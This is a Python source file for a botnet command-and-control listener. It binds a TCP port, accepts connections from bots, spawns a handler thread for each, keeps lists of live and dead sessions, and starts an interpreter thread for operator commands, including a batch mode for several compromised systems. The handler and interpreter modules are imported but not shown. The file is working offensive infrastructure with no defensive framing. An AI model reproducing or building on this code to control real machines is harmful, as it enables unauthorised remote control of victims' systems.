#!/usr/bin/python3

# Main imports
import socket
import sys
import os
import signal
import threading
import queue
import time

# Project imports
import handler
import interpreter
# from interpreter import Interpreter
# from handler import Handler

cmd_q = queue.Queue()

clientAddressList = {}      # Stores client_address[] info (IP, Port): IP is stored in string format, port is not

batchList = []              # List for systems that are being interacted with in BatchMode
#allConnections = []         # Stores all BotHandler instances
aliveConnections = []       # Stores all currently alive BotHandler sessions
deadConnections = []        # Records the dead-instance's information
                            # This may be an odd thing to implement. 
                            # Do we simply want to store the IP address + Port + ID?


def listener(lhost, lport, q):

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_address = (lhost, lport)
    server.bind(server_address)
    server.listen(100)

    print(f"[* Listener] Starting Botnet listener on tcp://{lhost}:{str(lport)}\n")

    InterpreterThread = interpreter.Interpreter()        # Handles interface, queue is for commands
    InterpreterThread.start()

    connRecord = 0

    while True:

        (client, client_address) = server.accept()  # start listening
        print(f"Connection received from {str(client_address[0])}")

        # BotHandler = Multiconn, a new BotHandler is spawned for each incoming connection
        newConn = handler.Handler(client, client_address, False, connRecord)
        aliveConnections.append(newConn)
        connRecord += 1
        newConn.start()

# -------------------------------------------------------------------------------------------

#import
def main():
    if (len(sys.argv) < 3):
        print(f"[* Interpreter-Msg] Usage:\n  [+] python3 {sys.argv[0]} <LHOST> <LPORT>\n  [+] Eg.: python3 {sys.argv[0]} 0.0.0.0 8080\n")
    else:
        try:
            lhost=sys.argv[1]
            lport=int(sys.argv[2])
            listener(lhost, lport, cmd_q)
        except Exception as ex:
            print(f"[-] Unable to establish the Handler. Error: {str(ex)}\n")

if __name__ == '__main__':
    main()
